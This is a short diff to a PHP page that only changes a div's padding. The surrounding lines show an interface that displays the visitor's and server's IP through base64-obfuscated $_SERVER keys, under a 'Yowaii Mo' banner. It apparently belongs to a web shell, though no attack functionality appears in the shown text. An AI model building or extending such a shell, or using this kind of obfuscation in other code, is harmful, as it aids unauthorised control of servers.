@@ -426,7 +426,7 @@ button, input:hover {
 <div class="footer kedip">
   <p>Yowaii Mo 🤡</p>
 </div>
-<div class="table-responsive text-light separator" style="text-align: left;padding: 4px;border: 2px solid #4200ac;border-radius:5px;">
+<div class="table-responsive text-light separator" style="text-align: left;padding: 12px 12px 4px;border: 2px solid #4200ac;border-radius:5px;">
     <div class="separate-table">
         <li>Your IP : <span style="color: #00ff00;"><?php echo $_SERVER[base64_decode('UkVNT1RFX0FERFI=')]; ?></span></li>
         <li>Server IP : <span style="color: #00ff00;"><?php echo $_SERVER[base64_decode('U0VSVkVSX05BTUU=')]; ?></span></li>
